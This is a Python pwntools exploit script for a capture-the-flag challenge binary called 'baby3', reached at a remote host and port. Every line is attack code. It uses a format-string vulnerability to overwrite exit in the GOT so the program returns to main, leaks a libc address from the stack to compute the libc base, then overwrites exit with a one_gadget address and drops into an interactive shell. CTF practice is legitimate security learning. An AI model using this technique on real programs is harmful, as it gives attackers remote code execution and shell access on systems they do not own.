from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
#r = process('./baby3')
#gdb.attach(r,'''b* 0x0000000000400846''')
r = remote('baby-01.pwn.beer', 10003)

elf = ELF('./baby3')
exit_got = elf.got['exit']
main = 0x40076f
one_gadget_offset = [0x4f2c5,0x4f322,0x10a38c][2]
fsb_offset = 6
ret_offset = fsb_offset + 39
libc_start_main_offset_diff = 231
libc_start_main_offset = 0x21ab0

#p = fmtstr_payload(fsb_offset, {exit_got: main}, numbwritten=0, write_size='short')
p = '%1903c%12$hn%63697c%13$hn%65472c%14$hn%15$hn'
p += 'a' * (0x30 - len(p))
p += p64(exit_got)
p += p64(exit_got+2)
p += p64(exit_got+4)
p += p64(exit_got+6)
r.sendlineafter(':', p)

p2 = '%' + str(ret_offset) + '$llx'
r.sendlineafter(':', p2)
libc_base = int(r.recvuntil('\n')[:-1],16) - libc_start_main_offset_diff - libc_start_main_offset
one_gadget = libc_base + one_gadget_offset

#p3 = fmtstr_payload(fsb_offset, {exit_got: one_gadget}, numbwritten=0, write_size='short')
short = [(one_gadget % 0x10000), ((one_gadget >> 16) % 0x10000), ((one_gadget >> 32) % 0x10000), ((one_gadget >> 48) % 0x10000)]


p3 = '%' + str(short[0])+ 'c%14$hn'
p3 += '%' + str((0x10000 - short[0]) + short[1])+ 'c%15$hn'
p3 += '%' + str((0x10000 - short[1]) + short[2])+ 'c%16$hn'
p3 += '%' + str((0x10000 - short[2]) + short[3])+ 'c%17$hn'
p3 += 'a' * (0x40 - len(p3))
p3 += p64(exit_got)
p3 += p64(exit_got+2)
p3 += p64(exit_got+4)
p3 += p64(exit_got+6)
r.sendlineafter(':', p3)
print hex(one_gadget)
r.interactive()
